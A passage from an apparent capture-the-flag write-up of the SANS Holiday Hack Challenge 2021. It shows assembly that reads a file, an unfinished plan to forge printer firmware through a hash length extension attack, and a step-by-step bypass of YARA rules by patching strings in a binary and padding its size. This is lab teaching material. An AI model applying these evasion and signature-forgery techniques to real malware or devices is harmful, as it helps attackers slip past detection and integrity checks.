<a class=header-link href=#11-reading-a-file><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#586e75>; TODO: Get a reference to this
</span></span></span><span style=display:flex><span><span style=color:#586e75></span><span style=color:#268bd2>call</span> <span style=color:#cb4b16>file_name</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#268bd2>db</span> &#39;/<span style=color:#cb4b16>var</span>/<span style=color:#cb4b16>northpolesecrets.txt</span>&#39;,<span style=color:#2aa198>0</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>file_name:
</span></span><span style=display:flex><span><span style=color:#268bd2>pop</span> <span style=color:#cb4b16>rbx</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#586e75>; TODO: Call sys_open
</span></span></span><span style=display:flex><span><span style=color:#586e75>; we can use the code from #10 here.
</span></span></span><span style=display:flex><span><span style=color:#586e75></span><span style=color:#268bd2>mov</span> <span style=color:#cb4b16>rax</span>, <span style=color:#2aa198>2</span>   <span style=color:#586e75>; Set rax to the syscall number for sys_open
</span></span></span><span style=display:flex><span><span style=color:#586e75></span><span style=color:#cb4b16>mov</span> <span style=color:#cb4b16>rdi</span>, <span style=color:#cb4b16>rbx</span> <span style=color:#586e75>; Set rdi to the first argument (the filename)
</span></span></span><span style=display:flex><span><span style=color:#586e75></span><span style=color:#cb4b16>mov</span> <span style=color:#cb4b16>rsi</span>, <span style=color:#2aa198>0</span>   <span style=color:#586e75>; Set rsi to the second argument (flags - 0 is fine)
</span></span></span><span style=display:flex><span><span style=color:#586e75></span><span style=color:#cb4b16>mov</span> <span style=color:#cb4b16>rdx</span>, <span style=color:#2aa198>0</span>   <span style=color:#586e75>; Set rdx to the third argument (mode - 0 is also fine)
</span></span></span><span style=display:flex><span><span style=color:#586e75></span><span style=color:#cb4b16>syscall</span>      <span style=color:#586e75>; Perform the syscall, now rax contains a handle to the file
</span></span></span><span style=display:flex><span><span style=color:#586e75></span>
</span></span><span style=display:flex><span><span style=color:#268bd2>mov</span> <span style=color:#cb4b16>rbx</span>, <span style=color:#cb4b16>rax</span> <span style=color:#586e75>; store the file descriptor returned by sys_open
</span></span></span><span style=display:flex><span><span style=color:#586e75></span>
</span></span><span style=display:flex><span><span style=color:#586e75>; TODO: Call sys_read on the file handle and read it into rsp
</span></span></span><span style=display:flex><span><span style=color:#586e75></span><span style=color:#268bd2>mov</span> <span style=color:#cb4b16>rax</span>, <span style=color:#2aa198>0</span>    <span style=color:#586e75>; Set rax to the correct syscall number for sys_read
</span></span></span><span style=display:flex><span><span style=color:#586e75></span><span style=color:#cb4b16>mov</span> <span style=color:#cb4b16>rdi</span>, <span style=color:#cb4b16>rbx</span>  <span style=color:#586e75>; Set rdi to the first argument (the file descriptor from sys_open)
</span></span></span><span style=display:flex><span><span style=color:#586e75></span><span style=color:#cb4b16>mov</span> <span style=color:#cb4b16>rsi</span>, <span style=color:#cb4b16>rsp</span>  <span style=color:#586e75>; Set rsi to the second argument (address in memory to save the input, using rsp for this)
</span></span></span><span style=display:flex><span><span style=color:#586e75></span><span style=color:#cb4b16>mov</span> <span style=color:#cb4b16>rdx</span>, <span style=color:#2aa198>1000</span> <span style=color:#586e75>; Set rdx to the third argument (maximum number of characters to accept, we need to experiment with this)
</span></span></span><span style=display:flex><span><span style=color:#586e75></span><span style=color:#cb4b16>syscall</span>       <span style=color:#586e75>; Perform the syscall, now rax contains the number of bytes that were read
</span></span></span><span style=display:flex><span><span style=color:#586e75></span>
</span></span><span style=display:flex><span><span style=color:#268bd2>mov</span> <span style=color:#cb4b16>rbx</span>, <span style=color:#cb4b16>rax</span>  <span style=color:#586e75>; store the number of bytes that were read in rbx
</span></span></span><span style=display:flex><span><span style=color:#586e75></span>
</span></span><span style=display:flex><span><span style=color:#586e75>; TODO: Call sys_write to write the contents from rsp to stdout (1)
</span></span></span><span style=display:flex><span><span style=color:#586e75></span><span style=color:#268bd2>mov</span> <span style=color:#cb4b16>rax</span>, <span style=color:#2aa198>1</span>    <span style=color:#586e75>; Set rax to the correct syscall number for sys_write
</span></span></span><span style=display:flex><span><span style=color:#586e75></span><span style=color:#cb4b16>mov</span> <span style=color:#cb4b16>rdi</span>, <span style=color:#2aa198>1</span>    <span style=color:#586e75>; Set rdi to the first argument (the file descriptor for stdout is 1)
</span></span></span><span style=display:flex><span><span style=color:#586e75></span><span style=color:#cb4b16>mov</span> <span style=color:#cb4b16>rsi</span>, <span style=color:#cb4b16>rsp</span>  <span style=color:#586e75>; Set rsi to the second argument (buf - this is the bytes read from the file now in rsp)
</span></span></span><span style=display:flex><span><span style=color:#586e75></span><span style=color:#cb4b16>mov</span> <span style=color:#cb4b16>rdx</span>, <span style=color:#cb4b16>rbx</span>  <span style=color:#586e75>; Set rdx to the third argument (length of the string in bytes that we got from sys_read)
</span></span></span><span style=display:flex><span><span style=color:#586e75></span><span style=color:#cb4b16>syscall</span>       <span style=color:#586e75>; Perform the syscall
</span></span></span><span style=display:flex><span><span style=color:#586e75></span>
</span></span><span style=display:flex><span><span style=color:#586e75>; TODO: Call sys_exit from #5
</span></span></span><span style=display:flex><span><span style=color:#586e75></span><span style=color:#268bd2>mov</span> <span style=color:#cb4b16>rax</span>, <span style=color:#2aa198>60</span> <span style=color:#586e75>; Set rax to the correct syscall number for sys_exit
</span></span></span><span style=display:flex><span><span style=color:#586e75></span><span style=color:#cb4b16>mov</span> <span style=color:#cb4b16>rdi</span>, <span style=color:#2aa198>99</span> <span style=color:#586e75>; Put the exit_code we want (99) in rdi
</span></span></span><span style=display:flex><span><span style=color:#586e75></span><span style=color:#cb4b16>syscall</span>     <span style=color:#586e75>; Perform the syscall
</span></span></span></code></pre></div><p>We read this text:</p><blockquote><p>Secret to KringleCon success: all of our speakers and organizers, providing
the gift of cyber security knowledge, free to the community.</p></blockquote><p>Answer is <code>cyber security knowledge</code>.</p><h1 id=7-printer-exploitation>7) Printer Exploitation
<a class=header-link href=#7-printer-exploitation><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><blockquote><p>Investigate the stolen Kringle Castle printer. Get shell access to read the
contents of <code>/var/spool/printer.log</code>. What is the name of the last file
printed (with a .xlsx extension)? Find Ruby Cyster in Jack's office for help
with this objective.</p></blockquote><p>Link to Kringle Castle printer: <a href=https://printer.kringlecastle.com/ target=_blank rel="noreferrer noopener">https://printer.kringlecastle.com/</a></p><h2 id=frostavator>Frostavator
<a class=header-link href=#frostavator><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p>The shellcode was in Jack Frost's room but we could access it without going
there. Ruby who has the hint for this challenge is there, too. It's time to use
the elevator in the Frost tower to get up there. We see <code>Grody Goiterson</code>
standing there.</p><blockquote><p>So hey, this is the Frostavator. It runs on some logic chips... that fell out.</p><p>I put them back in, but I must have mixed them up, because it isn't working now.</p><p>If you help me run the elevator, maybe I can help you with something else.</p><p>I'm pretty good with FPGAs, if that's worth something to ya'.</p></blockquote><p>Clicking on the elevator shows a label that says residential floors are
inaccessible.</p><p><img src=frostavator-01.jpg alt></p><p>We can click on <code>Open Panel</code> to see the inside and solve a puzzle with logic
gates.</p><p><img src=frostavator-02.jpg alt></p><p>Randomly swap the gates until it works.</p><p><img src=frostavator-03.jpg alt></p><p>Now, we can click on the <code>Jack's Office</code> or <code>Talks</code> button.</p><h2 id=ruby-cyster---printer-exploitation>Ruby Cyster - Printer Exploitation
<a class=header-link href=#ruby-cyster---printer-exploitation><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p>Use the frostavator to get to Jack's office.</p><blockquote><p>So first things first, you should definitely take a look at the firmware.</p><p>With that in-hand, you can pick it apart and see what's there.</p><p>Did you know that if you append multiple files of that type, the last one is
processed?</p><p>Have you heard of <a href=https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks target=_blank rel="noreferrer noopener">Hash Extension Attacks</a>?</p><p>If something isn't working, be sure to check the output! The error messages
are very verbose.</p><p>Everything else accomplished, you just might be able to get shell access to
that dusty old thing!</p></blockquote><p>Clicking on the printer there also opens up <a href=https://printer.kringlecastle.com/ target=_blank rel="noreferrer noopener">https://printer.kringlecastle.com/</a>.</p><p>Clicking on <code>more details</code> opens <code>/SuppliesStatus</code> and returns an error.</p><pre tabindex=0><code>Something went wrong!

Error in /app/lib/app.rb: Route not found: GET /SuppliesStatus
</code></pre><p>Another similar route:</p><pre tabindex=0><code>Something went wrong!

Error in /app/lib/app.rb: Route not found: GET /incoming/
</code></pre><p>Click on <code>Settings</code> will open <a href=https://printer.kringlecastle.com/config target=_blank rel="noreferrer noopener">https://printer.kringlecastle.com/config</a> and every
link goes to <code>/login</code>. Login needs a password and sends this POST request</p><pre tabindex=0><code>POST /login HTTP/2
Host: printer.kringlecastle.com

password=123456
</code></pre><p>And the result says login is disabled. <code>Reports</code> is similar, everything either
goes to <code>/config</code> or <code>/login</code>.</p><p><code>Firmware</code> is the place to go. We can upload a firmware AND we can also download
the current one for analysis.</p><p>The firmware is a JSON file. See the beautified version in
<a href=firmware-export.json>firmware-export.json</a>.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;firmware&#34;</span>: <span style=color:#2aa198>&#34;base64-blob&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;signature&#34;</span>: <span style=color:#2aa198>&#34;e0b5855c6dd61ceb1e0ae694e68f16a74adb6f87d1e9e2f78adfee688babcf23&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;secret_length&#34;</span>: <span style=color:#2aa198>16</span>,
</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;algorithm&#34;</span>: <span style=color:#2aa198>&#34;SHA256&#34;</span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>It's signed. We can probably bypass the signing and include our own firmware by
appending our own JSON object to this and uploading.</p><p>But let's see what's inside <code>firmware</code> with Cyberchef.</p><ol><li>After base64 decode the blob starts with <code>PK</code> which means it's a zip file.</li><li>If we unzip it we get an ELF file.</li></ol><p>Reading the <a href=https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks target=_blank rel="noreferrer noopener">Hash Extension Attacks</a> blog we find a tool
<a href=https://github.com/iagox86/hash_extender target=_blank rel="noreferrer noopener">hash_extender</a> that can append data to the end what's
signed without changing the hash.</p><h3 id=building-hash_extender-on-wsl>Building hash_extender on WSL
<a class=header-link href=#building-hash_extender-on-wsl><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><p>We just need to install <code>libssl-dev</code> and then run the <code>make</code> file.</p><pre tabindex=0><code>$ sudo apt-get install libssl-dev
$ make
 [CC] hash_extender_engine.o
 [CC] formats.o
 [LD] hash_extender
 [CC] hash_extender_test.o
 [LD] hash_extender_test
</code></pre><p>Now we can run <code>./hash_extender</code>.</p><h3 id=what-should-we-append>What Should We Append?
<a class=header-link href=#what-should-we-append><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><p>Ruby has this hint</p><blockquote><p>Did you know that if you append multiple files of that type, the last one is
processed?</p></blockquote><p>SKIPPING THIS FOR NOW.</p><p>This means we can either append a second ELF (or a bash file) or second zip file
to the firmware and upload it. Let's try both and see what happens. Apparently,
the error messages should tell us what we did wrong.</p><p>We need to get <code>/var/spool/printer.log</code>, should we add a route in the file below
and just paste the file there?</p><pre tabindex=0><code>Something went wrong!

Error in /app/lib/app.rb: Route not found: GET /SuppliesStatus
</code></pre><p><strong>Did wisdom teeth surgery at this point and the rest of the break was spent
dealing with that.</strong></p><hr><h1 id=9-splunk>9) Splunk!
<a class=header-link href=#9-splunk><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><blockquote><p>Help Angel Candysalt solve the Splunk challenge in Santa's great hall. Fitzy
Shortstack is in Santa's lobby, and he knows a few things about Splunk. What
does Santa call you when when you complete the analysis?</p></blockquote><p>Answer: <code>whiz</code>.</p><h2 id=fitzy-shortstack---yara-analysis>Fitzy Shortstack - Yara Analysis
<a class=header-link href=#fitzy-shortstack---yara-analysis><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p>Fitzy is in <code>Kringlecon > Entry</code>.</p><blockquote><p>OK. I AM worried. I've been thinking a bit about how malware might bypass YARA
rules.</p><p>I think if you make small, innocuous changes to the executable, you can get it
to run in spite of the YARA rules.</p></blockquote><p>We need to:</p><ol><li>Figure out which Yara rule is preventing the executable from running.</li><li>Modify it so it runs.</li><li>Tools needed are vim, emacs, nano, yara, and xxd.</li></ol><pre tabindex=0><code>$ ./the_critical_elf_app 
yara_rule_135 ./the_critical_elf_app
</code></pre><p>It's rule 135.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yaml data-lang=yaml><span style=display:flex><span>rule yara_rule_135 {
</span></span><span style=display:flex><span>   <span style=color:#268bd2>meta</span>:
</span></span><span style=display:flex><span>      description = &#34;binaries - file Sugar_in_the_machinery&#34;
</span></span><span style=display:flex><span>      author = &#34;Sparkle Redberry&#34;
</span></span><span style=display:flex><span>      reference = &#34;North Pole Malware Research Lab&#34;
</span></span><span style=display:flex><span>      date = &#34;1955-04-21&#34;
</span></span><span style=display:flex><span>      hash = &#34;19ecaadb2159b566c39c999b0f860b4d8fc2824eb648e275f57a6dbceaf9b488&#34;
</span></span><span style=display:flex><span>   <span style=color:#268bd2>strings</span>:
</span></span><span style=display:flex><span>      $s = &#34;candycane&#34;
</span></span><span style=display:flex><span>   <span style=color:#268bd2>condition</span>:
</span></span><span style=display:flex><span>      $s
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Looking at docs we can see this is a case-sensitive string, maybe we can change
the case or just change the complete string in the binary?</p><p>We can find the offset with <code>strings -o</code>:</p><pre tabindex=0><code>$ strings -t d the_critical_elf_app
// -t d: print the offset in decimal.
// -o here prints it in octal (equivalent of `-t o`), some versions of the
// utility print the offset in decimal with `-o` instead, not this version.
  ...
   8200 candycane
   8210 naughty string
   8232 This is critical for the execution of this program!!
   8288 HolidayHackChallenge{NotReallyAFlag}
   8325 dastardly string
   8487 :*3$&#34;
  ...

// or in hex with `-t x`
   2008 Candycane
   2012 naughty string
   2028 This is critical for the execution of this program!!
   2060 HolidayHackChallenge{NotReallyAFlag}
   2085 dastardly string
</code></pre><p>See the output in
<a href=strings-the_critical_elf_app.txt>strings-the_critical_elf_app.txt</a>.</p><p>We can also use <code>xxd</code> to see the dump.</p><pre tabindex=0><code>$ xxd -s 8200 -l 200 the_critical_elf_app
// -s: seek, start from this offset.
// -l: length of the chunk to dump.

00002008: 6361 6e64 7963 616e 6500 6e61 7567 6874  candycane.naught
00002018: 7920 7374 7269 6e67 0000 0000 0000 0000  y string........
00002028: 5468 6973 2069 7320 6372 6974 6963 616c  This is critical
00002038: 2066 6f72 2074 6865 2065 7865 6375 7469   for the executi
00002048: 6f6e 206f 6620 7468 6973 2070 726f 6772  on of this progr
00002058: 616d 2121 0000 0000 486f 6c69 6461 7948  am!!....HolidayH
00002068: 6163 6b43 6861 6c6c 656e 6765 7b4e 6f74  ackChallenge{Not
00002078: 5265 616c 6c79 4146 6c61 677d 0064 6173  ReallyAFlag}.das
00002088: 7461 7264 6c79 2073 7472 696e 6700 0000  tardly string...
00002098: 011b 033b 3c00 0000 0600 0000 88ef ffff  ...;&lt;...........
000020a8: 7000 0000 98ef ffff 9800 0000 a8ef ffff  p...............
000020b8: 5800 0000 91f0 ffff b000 0000 b8f0 ffff  X...............
000020c8: d000 0000 28f1 ffff                      ....(...
</code></pre><p>Let's modify the binary and change the case. We can use Vim (augh).</p><ol><li><code>vim the_critical_elf_app</code> to open the app.</li><li>Enter the <code>:%!xxd</code> command. This will convert the file to a
hexdump inside Vim.</li><li>Press PgDn to get to the string offset. Press <code>insert</code> twice to enter
<code>replace</code> mode.</li><li>Modify <code>63</code> which is <code>c</code> to <code>43</code> (<code>C</code>). We just need to replace <code>6</code> with <code>4</code>.</li><li>Press escape and then <code>:</code> to enter a command.</li><li>Enter <code>:%!xxd -r</code> to convert the file back to hex.</li><li>Save and exit with <code>:wq</code>.</li></ol><p>Running the file we get another rule alert. Seems like end up changing most of
those strings.</p><pre tabindex=0><code>$ ./the_critical_elf_app 
yara_rule_1056 ./the_critical_elf_app
</code></pre><p>Unfortunately, we cannot use <code>ctrl+w</code> inside nano to search because the browser
will try to close the page. I used Vim (augh) again. Press escape, then <code>/</code>,
then enter you search term, and press <code>enter</code>. Press <code>enter</code> again to switch to
that location in the file.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yaml data-lang=yaml><span style=display:flex><span>rule yara_rule_1056 {
</span></span><span style=display:flex><span>   <span style=color:#268bd2>meta</span>:
</span></span><span style=display:flex><span>        description = &#34;binaries - file frosty.exe&#34;
</span></span><span style=display:flex><span>        author = &#34;Sparkle Redberry&#34;
</span></span><span style=display:flex><span>        reference = &#34;North Pole Malware Research Lab&#34;
</span></span><span style=display:flex><span>        date = &#34;1955-04-21&#34;
</span></span><span style=display:flex><span>        hash = &#34;b9b95f671e3d54318b3fd4db1ba3b813325fcef462070da163193d7acb5fcd03&#34;
</span></span><span style=display:flex><span>    <span style=color:#268bd2>strings</span>:
</span></span><span style=display:flex><span>        $s1 = {6c 6962 632e 736f 2e36}
</span></span><span style=display:flex><span>        $hs2 = {726f 6772 616d 2121}
</span></span><span style=display:flex><span>    <span style=color:#268bd2>condition</span>:
</span></span><span style=display:flex><span>        all of them
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>More strings. Appear to be printable text.</p><pre tabindex=0><code>6c 6962 632e 736f 2e36
libc.so.6

726f 6772 616d 2121
rogram!!
</code></pre><p><code>all of them</code> means both strings must be present. So we can modify the second
one.</p><pre tabindex=0><code>$ strings -t d the_critical_elf_app  | grep -i &#34;rogram&#34;
8232 This is critical for the execution of this program!!
</code></pre><p>Let's edit offset <code>8232</code> (<code>0x2028</code>) again and modify <code>m</code> (<code>6d</code>) to <code>M</code> (<code>4d</code>).</p><pre tabindex=0><code>$ ./the_critical_elf_app 
yara_rule_1732 ./the_critical_elf_app
</code></pre><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yaml data-lang=yaml><span style=display:flex><span>rule yara_rule_1732 {
</span></span><span style=display:flex><span>   <span style=color:#268bd2>meta</span>:
</span></span><span style=display:flex><span>      description = &#34;binaries - alwayz_winter.exe&#34;
</span></span><span style=display:flex><span>      author = &#34;Santa&#34;
</span></span><span style=display:flex><span>      reference = &#34;North Pole Malware Research Lab&#34;
</span></span><span style=display:flex><span>      date = &#34;1955-04-22&#34;
</span></span><span style=display:flex><span>      hash = &#34;c1e31a539898aab18f483d9e7b3c698ea45799e78bddc919a7dbebb1b40193a8&#34;
</span></span><span style=display:flex><span>   <span style=color:#268bd2>strings</span>:
</span></span><span style=display:flex><span>      $s1 = &#34;This is critical for the execution of this program!!&#34; fullword ascii
</span></span><span style=display:flex><span>      $s2 = &#34;__frame_dummy_init_array_entry&#34; fullword ascii
</span></span><span style=display:flex><span>      $s3 = &#34;.note.gnu.property&#34; fullword ascii
</span></span><span style=display:flex><span>      $s4 = &#34;.eh_frame_hdr&#34; fullword ascii
</span></span><span style=display:flex><span>      $s5 = &#34;__FRAME_END__&#34; fullword ascii
</span></span><span style=display:flex><span>      $s6 = &#34;__GNU_EH_FRAME_HDR&#34; fullword ascii
</span></span><span style=display:flex><span>      $s7 = &#34;frame_dummy&#34; fullword ascii
</span></span><span style=display:flex><span>      $s8 = &#34;.note.gnu.build-id&#34; fullword ascii
</span></span><span style=display:flex><span>      $s9 = &#34;completed.8060&#34; fullword ascii
</span></span><span style=display:flex><span>      $s10 = &#34;_IO_stdin_used&#34; fullword ascii
</span></span><span style=display:flex><span>      $s11 = &#34;.note.ABI-tag&#34; fullword ascii
</span></span><span style=display:flex><span>      $s12 = &#34;naughty string&#34; fullword ascii
</span></span><span style=display:flex><span>      $s13 = &#34;dastardly string&#34; fullword ascii
</span></span><span style=display:flex><span>      $s14 = &#34;__do_global_dtors_aux_fini_array_entry&#34; fullword ascii
</span></span><span style=display:flex><span>      $s15 = &#34;__libc_start_main@@GLIBC_2.2.5&#34; fullword ascii
</span></span><span style=display:flex><span>      $s16 = &#34;GLIBC_2.2.5&#34; fullword ascii
</span></span><span style=display:flex><span>      $s17 = &#34;its_a_holly_jolly_variable&#34; fullword ascii
</span></span><span style=display:flex><span>      $s18 = &#34;__cxa_finalize&#34; fullword ascii
</span></span><span style=display:flex><span>      $s19 = &#34;HolidayHackChallenge{NotReallyAFlag}&#34; fullword ascii
</span></span><span style=display:flex><span>      $s20 = &#34;__libc_csu_init&#34; fullword ascii
</span></span><span style=display:flex><span>   <span style=color:#268bd2>condition</span>:
</span></span><span style=display:flex><span>      uint32(1) == 0x02464c45 and filesize &lt; 50KB and
</span></span><span style=display:flex><span>      <span style=color:#2aa198>10</span> of them
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>We have already taken care of <code>s1</code></p><pre tabindex=0><code>$s1 = &#34;This is critical for the execution of this program!!&#34; fullword ascii
</code></pre><p>We probably have these remaining.</p><pre tabindex=0><code>$s12 = &#34;naughty string&#34; fullword ascii
$s13 = &#34;dastardly string&#34; fullword ascii

$s19 = &#34;HolidayHackChallenge{NotReallyAFlag}&#34; fullword ascii
</code></pre><p>These are all case-sensitive and we can modify them again.</p><ul><li>s12 and s13: Change <code>s</code> (<code>0x73</code>) in <code>string</code> to <code>S</code> (<code>0x53</code>).</li><li>s19: Change the first <code>H</code> (<code>0x48</code>) to <code>h</code> (<code>0x68</code>).</li></ul><p>Seems like there is more. Changing some of those strings will make the file
unusable. However, I forgot to look at the conditions.</p><p>One condition is <code>filesize &lt; 50KB</code>. It's an ELF file, we can append garbage to
the end of the file to make it larger than 50KB to bypass this check. We can use
<code>dd</code>. First I just overwrote the file and had to start from scratch. We need to
<code>append</code> the zeroes.</p><pre tabindex=0><code>$ dd if=/dev/zero bs=100KB count=1 &gt;&gt; the_critical_elf_app
1+0 records in
1+0 records out
100000 bytes (100 kB, 98 KiB) copied, 0.000135379 s, 739 MB/s
</code></pre><p>And we are good.</p><pre tabindex=0><code>$ ./the_critical_elf_app 
Machine Running.. 
Toy Levels: Very Merry, Terry
Naughty/Nice Blockchain Assessment: Untampered
Candy Sweetness Gauge: Exceedingly Sugarlicious
Elf Jolliness Quotient: 4a6f6c6c7920456e6f7567682c204f76657274696d6520417070726f766564
</code></pre><p>The hex string is <code>Jolly Enough, Overtime Approved</code>.</p><p>Hints from Fitzy:</p><blockquote><p>Did you know Splunk recently added support for new data sources including
Sysmon for Linux and GitHub Audit Log data?</p><p>Between GitHub audit log and webhook event recording, you can monitor all
activity in a repository, including common git commands such as git add, git
status, and git commit.</p><p>You can also see cloned GitHub projects. There's a lot of interesting stuff
out there. Did you know there are repositories of code that are Darn
Vulnerable?</p><p>Sysmon provides a lot of valuable data, but sometimes correlation across data
types is still necessary.</p><p>Sysmon network events don't reveal the process parent ID for example.
Fortunately, we can pivot with a query to investigate process creation events
once you get a process ID.</p><p>Sometimes Sysmon data collection is awkward. Pipelining multiple commands
generates multiple Sysmon events, for example.</p><p>Did you know there are multiple versions of the Netcat command that can be used
maliciously? nc.openbsd, for example.</p></blockquote><h2 id=angel-candysalt---splunk>Angel Candysalt - Splunk!
<a class=header-link href=#angel-candysalt---splunk><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p>Teleport to <code>KringleCon > Great Room</code> for the Splunk challenge.</p><p>Angel does not have any hints. The terminal does
at <a href=https://hhc21.bossworkshops.io/en-US/app/SA-hhc/santadocs target=_blank rel="noreferrer noopener">https://hhc21.bossworkshops.io/en-US/app/SA-hhc/santadocs</a>.</p><blockquote><p>Eddie McJingles was a key DevOps engineer in Santa's North Pole Partner
Program, but he left suddenly. Your job is to document Eddie's project.</p><p>To complete this challenge, you need to search in Splunk and maybe a few
places on the Internet! To access the Splunk search interface, just click the
Search link in the navigation bar in the upper left hand corner of the page.</p><p>New to Splunk? Check out the sample <a href=https://hhc21.bossworkshops.io/en-US/app/SA-hhc/search target=_blank rel="noreferrer noopener">search</a> links provided.</p><p>This challenge is designed for a laptop or desktop computer with screen width
of 1600 pixels or more.</p></blockquote><p>Searching happens at
<a href=https://hhc21.bossworkshops.io/en-US/app/SA-hhc/search target=_blank rel="noreferrer noopener">https://hhc21.bossworkshops.io/en-US/app/SA-hhc/search</a>.</p><h3 id=task-1>Task 1
